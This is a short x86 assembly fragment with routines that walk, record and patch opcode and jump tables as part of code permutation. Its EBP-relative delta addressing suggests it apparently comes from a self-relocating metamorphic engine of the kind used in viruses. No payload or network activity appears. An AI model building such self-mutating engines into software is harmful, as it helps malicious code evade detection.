; Procedures needed to permutate opcode tables(and/or jump tables)

MaxTbls	equ	300

TravelOpTable	proc
	xor	eax,eax
	lodsb
	or	eax,eax
	jz	Traveled
	add	esi,eax

	mov	eax,esi
	stosd
	lodsd
	add	eax,ebp
	stosd
	inc	[Tbln][ebp]
	jmp	TravelOpTable
Traveled:
	ret
TravelOpTable	endp

TravelJmpTable	proc
	mov	eax,esi
	stosd
	lodsd
	add	eax,ebp
	stosd
	inc	[Tbln][ebp]
	loop	TravelJmpTable
	ret
TravelJmpTable	endp

CheckTblAddr	proc		; ESi - Addr
	mov	ecx,[Tbln][ebp]
	or	ecx,ecx
	jz	TData
	lea	ebx,[Tbls][ebp]
TCheckData:
	cmp	[ebx],esi
	jnz	TxPoint
	mov	[ebx],edi
TxPoint:
	cmp	[ebx][4],esi
	jnz	TPoint
	mov	[ebx][4],edi
TPoint:	add	ebx,8
	loop	TCheckData
TData:	ret
CheckTblAddr	endp

PatchTblData	proc
	mov	ecx,[Tbln][ebp]
	or	ecx,ecx
	jz	NoJmp
	lea	esi,[Tbls][ebp]
DataTblPatch:
	lodsd
	xchg	eax,ebx
	lodsd

;	sub	eax,[xDst][ebp]

	mov	[ebx],eax
	loop	DataTblPatch

	ret
PatchTblData	endp
